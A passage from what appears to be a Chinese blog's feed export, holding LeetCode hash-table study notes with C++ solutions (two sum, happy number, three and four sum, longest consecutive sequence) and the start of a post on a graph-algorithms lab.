class="built_in">end</span>();it++)</span><br><span class="line">            ans.<span class="built_in">push_back</span>(it-&gt;second);</span><br><span class="line">            <span class="comment">//first获取key，second获取value</span></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="438-找到字符串中所有字母异位词——滑动窗口"><a href="#438-找到字符串中所有字母异位词——滑动窗口" class="headerlink" title="438 找到字符串中所有字母异位词——滑动窗口"></a>438 找到字符串中所有字母异位词——滑动窗口</h3><p>给定两个字符串 s 和 p，找到 s 中所有 p 的 异位词 的<strong>子串</strong>，返回这些子串的起始索引。不考虑答案输出的顺序。<br>异位词 指由相同字母重排列形成的字符串（包括相同的字符串）。</p>
<h3 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349 两个数组的交集"></a>349 两个数组的交集</h3><p>给定两个数组 nums1 和 nums2 ，返回 它们的 <strong>交集</strong> 。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序。<br>注：使用数组来做哈希的题目，是因为题目都限制了数值的大小</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(m+n)</span></span><br><span class="line"><span class="comment">    将两个数组 分别装入unordered_set中</span></span><br><span class="line"><span class="comment">    利用set中count()函数判断</span></span><br><span class="line"><span class="comment">    遍历【短的set1】，看其每个元素是否在【长的set2中】，在的话将该元素插入集合</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getIntersection</span><span class="params">(unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set1,unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set1.<span class="built_in">size</span>()&gt;set2.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set2,set1);</span><br><span class="line">        <span class="comment">//保证 set1小，set2大</span></span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:set1)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set2.<span class="built_in">count</span>(num))</span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);<span class="comment">//不要求顺序</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; set1,set2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums1)&#123;</span><br><span class="line">            set1.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums2)&#123;</span><br><span class="line">            set2.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set1,set2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中<strong>找出 和为目标值 target 的那两个整</strong>数，并返回它们的<strong>数组下标</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力 O(n^2)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;<span class="comment">//j=i+1</span></span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>哈希表：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表 O(n)     unordered_map&lt;int,int&gt; maap;</span></span><br><span class="line"><span class="comment">    map中的存储结构为 &#123;key：元素值，value：元素下标&#125;</span></span><br><span class="line"><span class="comment">    获取下标：auto it = maap.find(target-nums[i]);</span></span><br><span class="line"><span class="comment">            if(it != maap.end())</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = maap.<span class="built_in">find</span>(target-nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(it != maap.<span class="built_in">end</span>())<span class="comment">//找到了某个值 	</span></span><br><span class="line">                <span class="keyword">return</span> &#123;it-&gt;second,i&#125;;</span><br><span class="line">            maap[nums[i]] = i;<span class="comment">//存入表中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202 快乐数"></a>202 快乐数</h3><p>编写一个算法来判断一个数 n 是不是快乐数。</p>
<p><strong>「快乐数」</strong>：对于一个正整数，每一次<strong>将该数替换为它每个位置上的数字的平方和</strong>，然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。如果 可以变为  1，那么这个数就是快乐数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  unordered_set&lt;int&gt; set; 判断某数曾经是否出现过</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 取数值各个位 平方 之和</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n) &#123;</span><br><span class="line">            sum += (n % <span class="number">10</span>) * (n % <span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; set;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="built_in">getSum</span>(n);</span><br><span class="line">            <span class="keyword">if</span> (sum == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 判断这个sum曾经是否出现过</span></span><br><span class="line">            <span class="keyword">if</span> (set.<span class="built_in">find</span>(sum) != set.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="comment">//if(set.count(sum))</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                set.<span class="built_in">insert</span>(sum);<span class="comment">//否则插入</span></span><br><span class="line">            &#125;</span><br><span class="line">            n = sum;<span class="comment">//更新 n,用 sum 替换</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="454-四数相加-II——可重复，-0"><a href="#454-四数相加-II——可重复，-0" class="headerlink" title="454 四数相加 II——可重复，==0"></a>454 四数相加 II——可重复，==0</h3><p>给你四个整数数组 nums1、nums2、nums3 和 nums4 ，数组长度都是 n ，请你计算有<code>多少个元组</code> (i, j, k, l) 能满足：</p>
<ul>
<li>0 &lt;= i, j, k, l &lt; n</li>
<li>nums1[i] + nums2[j] + nums3[k] + nums4[l] == 0</li>
</ul>
<p><strong>分析：</strong><br>四个独立的数组，只要找到A[i] + B[j] + C[k] + D[l] = 0就可以，不用考虑有重复的四个元素相加等于0的情况，相对于题目18. 四数之和，题目15.三数之和，简单了不少！</p>
<p><strong>解题步骤：</strong></p>
<ul>
<li>首先定义 一个unordered_map，key放a和b两数之和，value 放a和b两数之和出现的次数。</li>
<li>遍历大A和大B数组，统计两个数组元素之和，和出现的次数，放到map中。</li>
<li>定义int变量count，用来统计 a+b+c+d = 0 出现的次数。</li>
<li>在遍历大C和大D数组，找到如果 0-(c+d) 在map中出现过的话，就用count把map中key对应的value也就是出现次数统计出来。</li>
<li>最后返回统计值 count<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    unordered_map&lt;int, int&gt; umap;</span></span><br><span class="line"><span class="comment">    key：a和b两数之和   value：a和b两数之和出现的次数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fourSumCount</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; A, vector&lt;<span class="keyword">int</span>&gt;&amp; B, vector&lt;<span class="keyword">int</span>&gt;&amp; C, vector&lt;<span class="keyword">int</span>&gt;&amp; D)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; umap; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a : A) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> b : B) &#123;</span><br><span class="line">                umap[a + b]++;<span class="comment">//a+b之和：次数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> c : C) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> d : D) &#123;</span><br><span class="line">                <span class="keyword">if</span> (umap.<span class="built_in">find</span>(<span class="number">0</span>-(c + d)) != umap.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                    count += umap[<span class="number">0</span>-(c + d)];<span class="comment">//四数之和</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="15-三数之和——不能重复，-0"><a href="#15-三数之和——不能重复，-0" class="headerlink" title="15 三数之和——不能重复，==0"></a>15 三数之和——不能重复，==0</h3>给你<strong>一个整数数组 nums</strong> ，判断是否存在三元组 [nums[i], nums[j], nums[k]] 满足 <strong>i != j、i != k 且 j != k</strong>【<strong>不能重复</strong>】 ，同时还满足 nums[i] + nums[j] + nums[k] == 0 。</li>
<li>返回所有和为 0 且<strong>不重复</strong>的三元组。</li>
</ul>
<p><strong>难点：</strong><br>两层for循环就可以确定 a和b 的数值了，可以使用哈希法来确定 0-(a+b) 是否在 数组里出现过，这个思路是正确的，但是非常棘手的问题，就是题目中说的<code>不可以包含重复的三元组</code>。<br>并且，<br>把符合条件的三元组放进vector中，再去重，非常费时。<br><img src="https://img-blog.csdnimg.cn/2b801a963f644f288616dc09f0b0219e.png"><br><img src="https://img-blog.csdnimg.cn/309d876961324d2cb4dbdc48a99cb2e7.png"><br><a href="https://programmercarl.com/0015.%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C.html#%E5%8E%BB%E9%87%8D%E9%80%BB%E8%BE%91%E7%9A%84%E6%80%9D%E8%80%83">https://programmercarl.com/0015.%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C.html#%E5%8E%BB%E9%87%8D%E9%80%BB%E8%BE%91%E7%9A%84%E6%80%9D%E8%80%83</a></p>
<p><strong>注意：</strong><br>两数之和 就不能使用双指针法，因为1.两数之和要求返回的是<strong>索引下标</strong>， 而<strong>双指针法一定要排序，一旦排序之后原数组的索引就被改变了</strong>。<br>如果1.两数之和要求返回的是数值的话，就可以使用双指针法了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    排序+双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());<span class="comment">//升序排序</span></span><br><span class="line">        <span class="comment">// 找出a + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 排序之后如果第一个元素已经大于零，那么无论如何组合都不可能凑成三元组，直接返回结果就可以了</span></span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 正确去重a方法 记得i&gt;0</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> left = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (right &gt; left) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[left] + nums[right] &gt; <span class="number">0</span>) </span><br><span class="line">                    right--;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] + nums[left] + nums[right] &lt; <span class="number">0</span>) </span><br><span class="line">                    left++;</span><br><span class="line">                <span class="keyword">else</span> &#123;<span class="comment">//==0</span></span><br><span class="line">                    result.<span class="built_in">push_back</span>(vector&lt;<span class="keyword">int</span>&gt;&#123;nums[i], nums[left], nums[right]&#125;);</span><br><span class="line">                    <span class="comment">// 去重逻辑应该放在找到一个三元组之后，对b 和 c去重</span></span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 找到答案时，双指针同时收缩</span></span><br><span class="line">                    right--;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="18-四数之和——不能重复，-target"><a href="#18-四数之和——不能重复，-target" class="headerlink" title="18 四数之和——不能重复，==target"></a>18 四数之和——不能重复，==target</h3><p>给你<strong>一个由 n 个整数组成的数组 nums</strong> ，和一个目标值 target 。请你找出并返回满足下述全部条件且<strong>不重复</strong>的四元组 [ nums[a], nums[b], nums[c], nums[d] ] </p>
<ul>
<li>0 &lt;= a, b, c, d &lt; n</li>
<li>a、b、c 和 d 互不相同</li>
<li>nums[a] + nums[b] + nums[c] + nums[d] == target<br>可按 任意顺序 返回答案。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//O(n^3)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; nums.<span class="built_in">size</span>(); k++) &#123;</span><br><span class="line">            <span class="comment">// 剪枝处理  nums[k] &gt; target</span></span><br><span class="line">            <span class="keyword">if</span> (nums[k] &gt; target &amp;&amp; nums[k] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            	<span class="keyword">break</span>; <span class="comment">// 这里使用break，统一通过最后的return返回</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对nums[k]去重</span></span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span> &amp;&amp; nums[k] == nums[k - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = k + <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                <span class="comment">// 2级剪枝处理</span></span><br><span class="line">                <span class="keyword">if</span> (nums[k] + nums[i] &gt; target &amp;&amp; nums[k] + nums[i] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 对nums[i]去重</span></span><br><span class="line">                <span class="keyword">if</span> (i &gt; k + <span class="number">1</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) </span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">int</span> left = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">int</span> right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> (right &gt; left) &#123;</span><br><span class="line">                    <span class="comment">// nums[k] + nums[i] + nums[left] + nums[right] &gt; target 会溢出</span></span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">long</span>) nums[k] + nums[i] + nums[left] + nums[right] &gt; target) &#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    <span class="comment">// nums[k] + nums[i] + nums[left] + nums[right] &lt; target 会溢出</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">long</span>) nums[k] + nums[i] + nums[left] + nums[right]  &lt; target) &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        result.<span class="built_in">push_back</span>(vector&lt;<span class="keyword">int</span>&gt;&#123;nums[k], nums[i], nums[left], nums[right]&#125;);</span><br><span class="line">                        <span class="comment">// 对nums[left]和nums[right]去重</span></span><br><span class="line">                        <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">                        <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 找到答案时，双指针同时收缩</span></span><br><span class="line">                        right--;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="594-最长和谐子序列——数字差是1，返回长度"><a href="#594-最长和谐子序列——数字差是1，返回长度" class="headerlink" title="594 最长和谐子序列——数字差是1，返回长度"></a>594 最长和谐子序列——数字差是1，返回长度</h3></li>
</ul>
<p><strong>和谐数组</strong>：指一个数组里元素的【最大值和最小值之间的差别 正好是1】。<br>给你一个整数数组 nums ，请你在所有可能的子序列中<strong>找到最长的和谐子序列的长度</strong>。<br><strong>数组的子序列</strong>：是一个由数组派生出来的序列，它可以通过删除一些元素或不删除元素、且不改变其余元素的顺序而得到。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    枚举 O(NlogN)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLHS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//从小到大排序</span></span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;<span class="comment">//指向第一个连续相同元素的子序列的【第一个元素】</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//指向相邻的第二个连续相同元素的子序列的【末尾元素】</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> end=<span class="number">0</span>;end&lt;nums.<span class="built_in">size</span>(); end++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[end] - nums[begin] &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                begin++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[end] - nums[begin] == <span class="number">1</span>)&#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res,end-begin+<span class="number">1</span>);<span class="comment">//最长 子序列</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(N)  unordered_map&lt;int,int&gt; cnt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLHS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            cnt[num]++;<span class="comment">//数组每个元素出现的次数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [key,val]:cnt)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt.<span class="built_in">count</span>(key+<span class="number">1</span>))&#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res,val+cnt[key+<span class="number">1</span>]);<span class="comment">//当前元素 的个数 + 下一个元素的个数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="128-最长连续序列——数字连续，返回长度"><a href="#128-最长连续序列——数字连续，返回长度" class="headerlink" title="128 最长连续序列——数字连续，返回长度"></a>128 最长连续序列——数字连续，返回长度</h3><p>给定一个未排序的整数数组 nums ，找出<strong>数字连续的最长序列</strong>（不要求序列元素在原数组中连续）的<strong>长度</strong>。<br>请你设计并实现时间复杂度为 O(n) 的算法解决此问题。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(n)  unordered_set&lt;int&gt; num_set; 去重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; num_set;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span>&amp; num:nums)&#123;</span><br><span class="line">            num_set.<span class="built_in">insert</span>(num);<span class="comment">//去重</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> longestStreak = <span class="number">0</span>;<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span>&amp; num:num_set)&#123;<span class="comment">//去重后的 </span></span><br><span class="line">            <span class="keyword">if</span>(!num_set.<span class="built_in">count</span>(num<span class="number">-1</span>))&#123;<span class="comment">//不存在比num小1的数</span></span><br><span class="line">                <span class="keyword">int</span> currentNum = num;<span class="comment">//起点-当前连续子序列</span></span><br><span class="line">                <span class="keyword">int</span> currentStreak = <span class="number">1</span>;<span class="comment">//长度-当前连续子序列</span></span><br><span class="line">                <span class="keyword">while</span>(num_set.<span class="built_in">count</span>(currentNum+<span class="number">1</span>))&#123;<span class="comment">//存在比当前数 大1 的数</span></span><br><span class="line">                    currentNum += <span class="number">1</span>;<span class="comment">//注意 后移 </span></span><br><span class="line">                    currentStreak += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                longestStreak = <span class="built_in">max</span>(longestStreak,currentStreak);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> longestStreak;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构第三次实验-2-图的深度广度遍历、拓扑排序、最短路径、关键路径</title>
    <url>/2021/11/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C-2-%E5%9B%BE%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E9%81%8D%E5%8E%86%E3%80%81%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E3%80%81%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E3%80%81%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="数据结构第三次实验-2-图的深度广度遍历、拓扑排序、最短路径、关键路径"><a href="#数据结构第三次实验-2-图的深度广度遍历、拓扑排序、最短路径、关键路径" class="headerlink" title="数据结构第三次实验_2-图的深度广度遍历、拓扑排序、最短路径、关键路径"></a>数据结构第三次实验_2-图的深度广度遍历、拓扑排序、最短路径、关键路径</h1><blockquote>
<p><strong>文件介绍：</strong></p>
<p><code>graph.h</code>        邻接表创建 图结构定义（实现 深度、广度优先遍历）</p>
